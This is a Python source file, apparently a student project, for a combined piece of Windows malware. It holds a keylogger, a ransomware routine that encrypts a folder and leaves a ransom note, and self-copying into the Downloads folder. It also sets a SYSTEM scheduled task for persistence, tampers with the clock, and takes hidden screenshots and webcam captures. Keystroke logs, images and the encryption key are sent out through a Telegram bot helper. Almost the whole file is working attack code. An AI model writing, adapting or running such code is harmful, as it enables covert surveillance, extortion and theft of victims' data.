# File imports
from pynput.keyboard import Listener


import threading as th
from subprocess import PIPE, STARTUPINFO, STARTF_USESHOWWINDOW
import subprocess
import TBot as TB
import variables as vr
import ctypes
from datetime import datetime, timedelta
import time
import os
import cv2
import pyautogui
import encrypt as rw
import psutil

global DocName, keys, t1
keys = []
path = "C:\\Users\\angel\\Desktop\\ProyectoFinal\\"
date = datetime.now()


startupinfo = STARTUPINFO()
startupinfo.dwFlags |= STARTF_USESHOWWINDOW
startupinfo.wShowWindow = 0

yesterday = date - timedelta(days=1)

cmd1 = "date " + str(yesterday.strftime("%m-%d-%Y"))
cmd2 = "time " + str(date-timedelta(hours=1))[11:19]
cmd3 = 'schtasks /create /tn "WPy" /tr "C:/Users/angel/Desktop/ProyectoFinal/main.py" /sc onstart /ru "System"'
imgpath = "C:\\Users\\angel\\Desktop\\ProyectoFinal\\Resources\\WP.png"
cmd4 = "C:\\Users\\angel\\Desktop\\ProyectoFinal\\Resources\\FakePopVirus.jar"

#   Date
dt = str(vr.dt[:10])
#   Load DateTimeString to extract time
TimeStr = vr.dt[11:19].split(":")
hour = int(TimeStr[0])
min = int(TimeStr[1])
sec = int(TimeStr[2])
#   Calculate seconds
totalsec = (hour*3600) + (min*60) + sec

#   Specify routes to replicate itself
cPath = "C:\\Users\\angel\\Desktop\\ProyectoFinal\\main.py"
dPath = "C:\\Users\\angel\\Downloads\\"

# variables
rar = 0
encrypted = 0


def getdate():
    global date
    date = datetime.now()

#   Ex. 1


def checkDT():
    if vr.dt[:10] == str(date)[:10] and time.time() > totalsec:
        if os.path.exists(dPath):
            # copy yourself
            os.popen(f"copy {cPath} {dPath}")

#   Ex. 2


def wallpapersch():
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER, 0, imgpath, 0)
    subprocess.run(cmd1, startupinfo=startupinfo, stdin=PIPE,
                   stdout=PIPE, stderr=PIPE, shell=True)
    subprocess.run(cmd2, startupinfo=startupinfo, stdin=PIPE,
                   stdout=PIPE, stderr=PIPE, shell=True)
    subprocess.run(cmd3, startupinfo=startupinfo, stdin=PIPE,
                   stdout=PIPE, stderr=PIPE, shell=True)

#   Ex. 4


def ransom():
    global encrypted
    path_to_encrypt = 'C:\\Users\\angel\\Desktop\\Gatitos'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]
    rw.generar_key()
    key = rw.cargar_key()
    for process in psutil.process_iter():
        if process.name() == 'CalculatorApp.exe' and encrypted == 0:
            rw.encrypt(full_path, key)
            with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
                file.write('Ficheros encriptados por el AP1103314 \n')
                file.write('Dame una suscripcion para desencriptar. Thanks')
            TB.msg(key)
            encrypted = 1
    th.Timer(10, ransom).start()

#   Ex. 5


def sendMsg():
    TB.sendDoc(fp)
    th.Timer(10, sendMsg).start()


def ss():
    pp = path + "Photos\\" + \
        str(datetime.now()).replace(":", ".")+".png"
    myss = pyautogui.screenshot()
    myss.save(pp)
    try:
        TB.sendPhoto(pp)
    except:
        print(Exception)
    th.Timer(60, ss).start()

#   Ex. 3


def popups():
    subprocess.run(cmd4, startupinfo=startupinfo,
                   stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)


def writefile(keys):
    global fp
    getdate()
    checkDT()
    DocName = str(date).replace(":", ".") + ".txt"
    fp = path + "logs\\" + DocName
    with open(fp, "w") as f:
        for key in keys:
            k = key.replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("enter") > 0:
                f.write('\n')
            else:
                f.write(k)


def vkey(key):
    global rar
    keys.append(f"{key}")
    writefile(keys)
    print(f"{key} pressed")

    for key in keys:
        k = key.replace("'", "").replace("\\", "")
        if k == "x03":  # Ctrl + C
            print("llegué")
            popups()
        elif k == "x16":  # Ctrl + V
            print("Entré")
            if rar == 0:
                th.Timer(60, ss).start()
                th.Timer(10, sendMsg).start()
                rar = rar + 1
        elif k == "x18":  # Ctrl + X
            print("Entré2")
            camera()
        else:
            pass
    keys.clear()

#   Ex. 6


def camera():
    cam_port = 0
    cam = cv2.VideoCapture(cam_port)
    result, image = cam.read()
    if result:
        photopath = f"C:\\Users\\angel\\Desktop\\ProyectoFinal\\Camera\\" + \
            str(date).replace(":", ".")+".png"
        cv2.imwrite(photopath, image)
        try:
            TB.sendPhoto(photopath)
        except:
            print(Exception)
    else:
        print("No image detected. Please! try again")


def run():
    with Listener(on_press=vkey) as listener:
        listener.join()


th.Timer(10, ransom).start()
wallpapersch()
run()
